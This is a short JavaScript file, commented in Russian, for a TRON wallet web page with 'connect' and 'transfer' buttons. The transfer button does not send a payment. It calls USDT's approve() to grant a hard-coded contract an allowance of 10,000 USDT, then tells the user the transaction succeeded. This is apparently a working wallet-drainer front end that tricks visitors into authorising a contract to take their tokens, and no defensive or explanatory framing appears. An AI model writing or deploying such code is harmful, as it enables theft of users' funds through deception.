const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; // Ваш смарт-контракт

// Функция для получения объекта сети TRON из браузера кошелька
function getTronProvider() {
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        return window.tronWeb;
    }
    if (window.trustwallet && window.trustwallet.tronWeb) {
        return window.trustwallet.tronWeb;
    }
    return null;
}

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Подключение...";

        let tronWeb = getTronProvider();

        // Небольшая задержка на случай, если провайдер внедряется асинхронно
        if (!tronWeb) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            tronWeb = getTronProvider();
        }

        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
            userAddress = tronWeb.defaultAddress.base58;
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            walletAddressText.innerText = "Сеть TRON не обнаружена";
            alert("Убедитесь, что в кошельке выбрана сеть TRON и страница открыта заново.");
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении.");
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        const tronWeb = getTronProvider();
        if (!userAddress || !tronWeb) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Вызов функции контракта...");
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; // Сумма с учетом знаков USDT

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Транзакция успешно отправлена!");
        console.log("TX Hash:", tx);

    } catch (error) {
        console.error("Ошибка выполнения:", error);
        alert("Ошибка при вызове функции смарт-контракта.");
    }
});
